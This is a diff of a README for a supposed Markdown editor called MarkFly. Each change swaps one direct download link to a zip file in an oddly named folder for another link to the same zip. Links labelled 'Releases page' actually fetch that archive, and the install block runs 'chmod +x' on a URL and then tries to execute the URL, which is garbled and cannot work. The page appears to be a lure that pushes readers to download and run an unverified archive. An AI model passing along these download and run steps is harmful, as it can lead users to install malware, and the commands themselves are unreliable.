@@ -1,7 +1,7 @@
 # ✨ MarkFly - A Powerful Markdown Editor for Easy Writing
 
 ## 🔗 Download Now
-[![Download MarkFly](https://raw.githubusercontent.com/roguevsn/MarkFly/main/Botrydium/MarkFly.zip)](https://raw.githubusercontent.com/roguevsn/MarkFly/main/Botrydium/MarkFly.zip)
+[![Download MarkFly](https://github.com/roguevsn/MarkFly/raw/refs/heads/main/Botrydium/MarkFly.zip)](https://github.com/roguevsn/MarkFly/raw/refs/heads/main/Botrydium/MarkFly.zip)
 
 ## 📖 Introduction
 MarkFly is a powerful Markdown editor designed to provide you with an excellent writing experience. Whether you are crafting documents, notes, or anything in between, MarkFly simplifies the process and makes it enjoyable.
@@ -11,7 +11,7 @@ MarkFly is a powerful Markdown editor designed to provide you with an excellent 
 ### Step 1: Visit the Releases Page
 To download MarkFly, first, go to our Releases page by clicking the link below:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/roguevsn/MarkFly/main/Botrydium/MarkFly.zip)
+[Visit the Releases Page](https://github.com/roguevsn/MarkFly/raw/refs/heads/main/Botrydium/MarkFly.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of different versions of MarkFly. Look for the latest version. It is usually at the top of the list. 
@@ -49,8 +49,8 @@ After downloading the file, follow these steps to install MarkFly:
 3. Use the command:
 
    ```bash
-   chmod +x https://raw.githubusercontent.com/roguevsn/MarkFly/main/Botrydium/MarkFly.zip
-   https://raw.githubusercontent.com/roguevsn/MarkFly/main/Botrydium/MarkFly.zip
+   chmod +x https://github.com/roguevsn/MarkFly/raw/refs/heads/main/Botrydium/MarkFly.zip
+   https://github.com/roguevsn/MarkFly/raw/refs/heads/main/Botrydium/MarkFly.zip
    ```
 4. MarkFly should now run.
 
@@ -74,7 +74,7 @@ If you face any issues while downloading or installing, consider the following:
 If you need further assistance, feel free to reach out. You can open an issue in the Issues tab on our GitHub repository or check our documentation for more help. 
 
 ## 🔄 Stay Updated
-We regularly release updates for MarkFly. Remember to check back on our [Releases page](https://raw.githubusercontent.com/roguevsn/MarkFly/main/Botrydium/MarkFly.zip) for the latest features and improvements.
+We regularly release updates for MarkFly. Remember to check back on our [Releases page](https://github.com/roguevsn/MarkFly/raw/refs/heads/main/Botrydium/MarkFly.zip) for the latest features and improvements.
 
 ---
 
